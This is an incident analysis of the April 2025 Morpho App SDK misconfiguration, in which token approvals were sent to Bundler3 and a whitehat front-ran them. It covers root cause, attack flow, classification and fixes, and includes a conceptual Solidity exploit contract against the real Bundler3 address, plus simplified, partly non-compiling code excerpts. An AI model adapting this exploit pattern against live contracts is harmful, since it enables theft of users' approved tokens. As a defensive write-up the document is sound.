# Morpho Blue — Misconfigured Market Settings Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2025-04-10 |
| **Protocol** | Morpho Blue (Morpho App / Bundler3) |
| **Chain** | Ethereum |
| **Loss** | ~$2,601,443 (1,708.64 ETH, price $1,522.52/ETH) |
| **Attacker** | N/A (any actor monitoring the mempool) |
| **Whitehat Intervention** | [c0ffeebabe.eth](https://etherscan.io/address/0xc0ffeebabe0000000000000000000000000000000) — intercepted funds and returned them |
| **Vulnerable Contract** | [Bundler3 (0x65661941...a2dc90245)](https://etherscan.io/address/0x6566194141eefa99af43bb5aa71460ca2dc90245) |
| **Correct Target** | [Ethereum General Adapter1 (0x4a6c312e...d42be0ae0)](https://etherscan.io/address/0x4a6c312ec70e8747a587ee860a0353cd42be0ae0) |
| **Root Cause** | Frontend SDK update misconfiguration — token approvals were incorrectly directed to the Bundler3 contract itself rather than the Bundler3 adapter |
| **Reference** | [Morpho Official Incident Report](https://morpho.org/blog/morpho-app-incident-april-10-2025/) |

---

## 1. Vulnerability Overview

### Background: Morpho Blue and the Bundler Architecture

Morpho Blue is a permissionless lending protocol on Ethereum. Users interact through the Morpho App frontend to bundle complex DeFi operations — supply, withdraw, collateral management — into a single transaction. This functionality is handled by the **Bundler** contract.

- **Bundler2 (legacy)**: Users approve ERC-20 tokens directly to the Bundler → Bundler executes operations via adapters
- **Bundler3 (new)**: Token approvals must be granted only to the **Adapter contract**, not to the Bundler3 contract itself

The core security assumption of the Bundler3 architecture is:
> _Users must not grant token approvals directly to the Bundler3 contract. Approvals must always be granted to adapters, which prevent unauthorized transfers via initiator-based access control._

### Incident Trigger

On April 10, 2025, the Morpho development team updated the Morpho App SDK from Bundler2 to a **Bundler3-integrated version**. However, the updated SDK contained a misconfiguration:

- **Error**: When the SDK (e.g., `@morpho-org/bundler-sdk-viem`) constructed user transaction bundles, it directed token approvals to the **Bundler3 contract address** directly, rather than to an **adapter address** such as Ethereum General Adapter1.
- **Consequence**: Unlike adapters, Bundler3 has no initiator-based access control, meaning anyone who detected such an approval in the mempool could exploit it to drain the approved tokens.

### Whitehat Intervention and Resolution

Known whitehat MEV operator **c0ffeebabe.eth** detected the vulnerable transactions in the mempool and front-ran malicious actors to intercept approximately **1,708.64 ETH ($2,601,443)**. The funds were subsequently returned in full to the affected users, and c0ffeebabe.eth received a bug bounty reward through Immunefi.

The Morpho team rolled back the frontend update **within 4 minutes** of receiving the security alert.

> **Key Point**: This incident was caused by an **off-chain SDK misconfiguration**, not a flaw in the on-chain smart contracts themselves. The Morpho Blue protocol contracts functioned correctly.

---

## 2. Vulnerable Code Analysis

### 2.1 SDK Approval Target Misconfiguration (Core Vulnerability)

**Vulnerable SDK Behavior (pseudocode)**:

```solidity
// ❌ Vulnerable: approval target is Bundler3 contract itself, not the adapter
// Misconfiguration in @morpho-org/bundler-sdk-viem

// Approval generated when constructing user transaction bundle
IERC20(token).approve(
    address(bundler3),        // ❌ Bundler3 contract — no access control!
    amountNeededForTx         // Approves exact amount (no excess)
);
```

**Correct Behavior (after patch)**:

```solidity
// ✅ Fixed: approval target set to the adapter contract
// @morpho-org/bundler-sdk-viem@3.0.0-next.14 and later

// Approval generated when constructing user transaction bundle
IERC20(token).approve(
    address(generalAdapter1), // ✅ Ethereum General Adapter1 — has initiator access control
    amountNeededForTx
);
```

**Problem**: Unlike adapters, the Bundler3 contract has no access control logic to validate the transaction initiator. Therefore, any external actor can exploit an approval granted to Bundler3 to transfer a user's tokens.

### 2.2 Bundler3 vs. Adapter Access Control Comparison

**Bundler3 Contract (vulnerable)**:

```solidity
// ❌ Bundler3: no initiator validation
// Address: 0x6566194141eefa99af43bb5aa71460ca2dc90245
contract Bundler3 {
    function multicall(bytes[] calldata data) external payable {
        // Executes without checking initiator
        // Anyone can exploit this if approval is granted to this contract
        for (uint256 i = 0; i < data.length; ++i) {
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success);
        }
    }
}
```

**GeneralAdapter1 Contract (safe)**:

```solidity
// ✅ GeneralAdapter1: initiator-based access control
// Address: 0x4a6c312ec70e8747a587ee860a0353cd42be0ae0
contract GeneralAdapter1 {
    address public immutable BUNDLER3;

    modifier onlyBundler3() {
        require(msg.sender == BUNDLER3, "not bundler");
        _;
    }

    // Validates initiator to ensure only the transaction originator benefits
    function transferFrom(address token, address from, uint256 amount)
        external onlyBundler3
    {
        // ✅ Only allows calls via Bundler3 → only the original transaction initiator benefits
        IERC20(token).transferFrom(from, address(this), amount);
    }
}
```

---

## 3. Attack Flow

### 3.1 Setup Phase

- Attack prerequisite: When a Morpho App user attempts any supply/withdraw operation after the Bundler3 update, the misconfigured SDK automatically generates a transaction that grants a token approval to the Bundler3 contract.
- The attacker requires no special preparation — only monitoring the Ethereum mempool.

### 3.2 Execution Phase

```
Step 1: Propagation of SDK-misconfigured transaction
──────────────────────────────────────────────────────────────────
  Victim (EOA)
      │
      │  approve(Bundler3, amount)   ← ❌ Approval to Bundler3, not the adapter
      ▼
  Ethereum Mempool (publicly pending)
      │
      ├──▶ Scheduled for normal mining (victim's intent)
      │
      └──▶ Detected by attacker/MEV bot monitoring the mempool
```

```
Step 2: Front-run execution
──────────────────────────────────────────────────────────────────
  Mempool monitor (attacker or whitehat c0ffeebabe.eth)
      │
      │  Submits transaction ahead with higher gas
      ▼
  Ethereum miner/validator
      │
      │  Processes attacker's transaction first
      ▼
  Bundler3.multicall([
      transferFrom(token, victim, amount)  ← Exploits approval granted to Bundler3
  ])
      │
      │  transferFrom succeeds (approval exists)
      ▼
  ~1,708.64 ETH worth of funds moved to attacker/whitehat address
```

```
Step 3: Whitehat response and resolution
──────────────────────────────────────────────────────────────────
  c0ffeebabe.eth
      │
      ├── Intercepts funds ($2,601,443 worth)
      │
      ├── Reports vulnerability to Morpho team and Immunefi
      │
      └── Returns full amount to victims + receives bug bounty
          │
  Morpho team
      │
      ├── Rolls back frontend within 4 minutes of receiving alert
      │
      └── Deploys patched SDK versions
          - @morpho-org/bundler-sdk-viem@3.0.0-next.14
          - @morpho-org/blue-sdk-viem@3.0.0-next.6
          - @morpho-org/blue-sdk-ethers@3.0.0-next.4
```

### Full Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    Morpho App (Frontend)                     │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Misconfigured SDK: approve target = Bundler3 (❌)   │    │
│  └──────────────────────────┬──────────────────────────┘    │
│                             │                               │
└─────────────────────────────▼───────────────────────────────┘
                              │
                   User-signed transaction
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                  Ethereum Mempool (Public)                    │
│                                                             │
│  [approve(Bundler3, ~1708 ETH worth of tokens)] — pending   │
│        │                                                    │
│        ├── Detected by: mempool monitoring bot (c0ffeebabe.eth) │
│        │                                                    │
│        └── Front-run transaction submitted (higher gas)      │
└─────────────────────────────────────────────────────────────┘
                              │
              ┌───────────────┴───────────────┐
              ▼                               ▼
┌─────────────────────┐           ┌───────────────────────┐
│   Bundler3 Contract  │           │  Victim's original tx  │
│  (no access ctrl ❌) │           │   (mined later)        │
│                     │           │                       │
│ multicall([         │           │  Approval already used │
│  transferFrom(      │           │  → tx fails or no-ops  │
│    victim,          │           └───────────────────────┘
│    amount           │
│  )]                 │
└──────────┬──────────┘
           │
           │  transferFrom succeeds
           ▼
┌─────────────────────┐
│  c0ffeebabe.eth     │
│  Receives $2,601,443│
└──────────┬──────────┘
           │
           │  Reports via Immunefi + returns full amount
           ▼
┌─────────────────────┐
│  Victims (restored) │
│  Morpho team (rolled│
│  back)              │
└─────────────────────┘
```

### 3.3 Outcome

- **Intercepted amount**: 1,708.64280716451270409 ETH ($2,601,443)
- **Actual loss**: $0 (c0ffeebabe.eth returned everything)
- **Reported loss**: ~$2.6M per initial PeckShield report (subsequently returned; no permanent loss)
- **Rollback time**: 4 minutes

---

## 4. PoC Code (Proof of Concept — Attack Principle)

> No official PoC `.sol` file exists in DeFiHackLabs for this incident. The pseudocode below illustrates the vulnerability principle.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Attack principle explanation (pseudocode)
// Actual attack was executed via mempool monitoring + front-running

interface IBundler3 {
    // Bundler3's multicall: no initiator validation
    function multicall(bytes[] calldata data) external payable;
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ConceptualExploitDemo {
    IBundler3 constant bundler3 = IBundler3(0x6566194141eefa99Af43Bb5Aa71460Ca2Dc90245);

    function exploit(
        address victim,      // Victim who sent a misconfigured approve
        address token,       // Token the victim approved
        uint256 amount       // Amount the victim approved
    ) external {
        // Step 1: Verify victim has approved Bundler3
        // (if the vulnerable SDK-generated tx is already in mempool or mined)
        uint256 allowance = IERC20(token).allowance(victim, address(bundler3));
        require(allowance >= amount, "no approval");

        // Step 2: Transfer victim's tokens via Bundler3.multicall
        // Bundler3 has no initiator validation, so anyone can call this
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSignature(
            "transferFrom(address,address,address,uint256)",
            token,
            victim,
            address(this),  // Transfer to attacker address
            amount
        );

        // ❌ Bundler3 does not block this call (no access control)
        bundler3.multicall(calls);

        // Step 3: Funds moved to attacker's wallet
        // In practice, c0ffeebabe.eth (whitehat) executed this first and returned the funds
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | SDK off-chain misconfiguration — incorrect approval target | CRITICAL | CWE-732 (Incorrect Permission Assignment) |
| V-02 | Bundler3 missing access control — no initiator validation | HIGH | CWE-284 (Improper Access Control) |
| V-03 | Mempool public exposure — sensitive transactions susceptible to front-running | MEDIUM | CWE-362 (Race Condition) |

### V-01: SDK Off-Chain Misconfiguration

- **Description**: The frontend SDK (`@morpho-org/bundler-sdk-viem`) incorrectly set the token approval target to the Bundler3 contract itself instead of an adapter contract during the Bundler3 integration update.
- **Impact**: When users execute transactions through the Morpho App, token access rights are unintentionally granted to the Bundler3 contract rather than the intended adapter.
- **Attack Condition**: User performs an operation on the Morpho App while the misconfigured SDK version is deployed.

### V-02: Bundler3 Missing Access Control

- **Description**: Unlike adapters, the Bundler3 contract has no logic to validate the original user (initiator) who initiated the transaction. Therefore, if an approval is granted to Bundler3, external attackers can also exploit that approval.
- **Impact**: Token approvals granted to Bundler3 can be diverted for purposes other than their original intent.
- **Attack Condition**: User sends or exposes to the mempool a transaction that approves tokens to Bundler3 (chained with V-01).

### V-03: Mempool Public Exposure

- **Description**: User transaction data is exposed in Ethereum's public mempool before mining. When a vulnerable approval is exposed in the mempool due to V-01, anyone can detect and front-run it.
- **Impact**: Had a malicious actor front-run instead of the whitehat, the funds would have been genuinely stolen.
- **Attack Condition**: Operating a mempool monitoring bot on the public Ethereum mempool.

---

## 6. Remediation Recommendations

### Immediate Actions

```typescript
// ✅ Fix: always direct approvals to the adapter
// Applied in @morpho-org/bundler-sdk-viem@3.0.0-next.14 and later

// Misconfigured (vulnerable)
const approvalTarget = bundler3Address; // ❌

// Correct configuration (after fix)
const approvalTarget = generalAdapter1Address; // ✅
// Or dynamically query the adapter address by chain
const approvalTarget = await bundler3.getAdapter(chainId);
```

```solidity
// ✅ Add defensive logic to Bundler3 to block direct approvals (defensive design)
contract Bundler3 {
    // Explicitly prevent this contract from being used as an approval target
    function _checkNotDirectApprovalTarget() internal view {
        // Prevent direct-approval pattern at SDK level
        // At contract level, add initiator validation on transferFrom calls
        require(
            initiator != address(0) && initiator == _getOriginalCaller(),
            "Bundler3: direct approval forbidden"
        );
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: SDK misconfiguration | Add automated tests to verify approval target addresses before SDK deployment; hardcode adapter addresses as constants and strengthen code review |
| V-02: Missing access control | Add initiator tracking and validation logic to Bundler3; enforce adapter pattern as the mandatory routing path |
| V-03: Mempool exposure | Use private mempools (Flashbots MEV-Protect, etc.) for sensitive approval transactions; replace direct approvals with EIP-2612 permit pattern |
| Overall | Conduct periodic external security audits of off-chain SDK/frontend code; extend smart contract audit scope to include SDKs and integration layers |

---

## 7. Lessons Learned

1. **Off-chain code must be audited too**: This incident was caused not by a bug in on-chain smart contracts, but by a misconfiguration in the SDK and frontend. Security audits for DeFi protocols must encompass off-chain code (SDKs, APIs, frontends) as well.

2. **Adhere to the Principle of Least Privilege**: In smart contract systems, token approvals (approvals) should be granted to the narrowest possible set of contracts. Never grant direct approvals to contracts that lack access control.

3. **Security validation is critical during architecture transitions**: Changes to core architecture — such as the migration from Bundler2 to Bundler3 — require a dedicated process to verify the security impact of changes to approval flows.

4. **Use the permit pattern to minimize approval exposure**: Using the EIP-2612 `permit` function allows the approval to be processed together with the main transaction rather than being independently exposed in the mempool, reducing front-running risk.

5. **Collaboration with the whitehat ecosystem**: It was fortunate that c0ffeebabe.eth discovered and exploited the vulnerability before a malicious actor did. Active bug bounty programs (such as Immunefi) and the whitehat ecosystem serve as a practical line of defense for DeFi security.

6. **Rapid incident response**: The Morpho team's ability to roll back the frontend within 4 minutes of receiving the alert was critical to minimizing damage. Real-time monitoring and an immediate response framework are essential in DeFi security.

---

## 8. On-Chain Verification

> Written based on Morpho team's official announcement and multiple security research sources. Attack transaction hashes have not been confirmed from public sources, but the Bundler3 contract address and related context are confirmed in the official report.

### 8.1 Incident Amount Verification

| Item | Value |
|------|----|
| Intercepted ETH | 1,708.64280716451270409 ETH |
| ETH closing price on April 10 | $1,522.52 |
| Calculated USD value | $2,601,442.85 |
| Officially reported loss | ~$2,600,000 |
| Actual permanent loss | $0 (fully returned) |

### 8.2 Related Contract Addresses

| Contract | Address | Role |
|----------|------|------|
| Morpho Blue | [0xBBBBBBbb...eeffcb](https://etherscan.io/address/0xbbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb) | Core protocol (functioning correctly) |
| Bundler3 (Ethereum) | [0x65661941...a2dc90245](https://etherscan.io/address/0x6566194141eefa99af43bb5aa71460ca2dc90245) | Incorrect approval target |
| ETH Bundler | [0xa7995f71...5dbf55107](https://etherscan.io/address/0xa7995f71aa11525db02fc2473c37dee5dbf55107) | ETH-specific bundler |
| General Adapter1 | [0x4a6c312e...d42be0ae0](https://etherscan.io/address/0x4a6c312ec70e8747a587ee860a0353cd42be0ae0) | Correct approval target (adapter) |

### 8.3 Incident Timeline

| Time | Event |
|------|------|
| 2025-04-10 | Misconfigured SDK version deployed to frontend |
| 2025-04-10 | c0ffeebabe.eth detects vulnerable transaction in mempool and front-runs it |
| 2025-04-10 | PeckShield issues initial report of $2.6M theft |
| 2025-04-10 | Morpho team rolls back frontend **within 4 minutes** of receiving alert |
| Subsequently | c0ffeebabe.eth returns full amount to victims, receives bounty via Immunefi |
| Subsequently | Patched SDK versions fully deployed |

---

## References

- [Morpho Official Incident Report (2025-04-10)](https://morpho.org/blog/morpho-app-incident-april-10-2025/)
- [CoinTelegraph: White Hat Intercepts $2.6M Morpho Blue Hack](https://cointelegraph.com/news/white-hat-intercepts-2-million-morpho-blue-hack)
- [CyberDSA: MorphoBlue Vulnerability Details](https://www.cyberdsa.com/morphoblue-vulnerability)
- [CyberExpress: Morpho App Vulnerability Analysis](https://thecyberexpress.com/morphoblue-vulnerability/)
- [AInvest: Morpho Labs Averts $2.6M Hack via White Hat MEV Bot](https://www.ainvest.com/news/morpho-labs-averts-2-6m-hack-white-hat-mev-bot-2504/)
- [Morpho Bundler3 — Etherscan](https://etherscan.io/address/0x6566194141eefa99af43bb5aa71460ca2dc90245)
- [Morpho General Adapter1 — Etherscan](https://etherscan.io/address/0x4a6c312ec70e8747a587ee860a0353cd42be0ae0)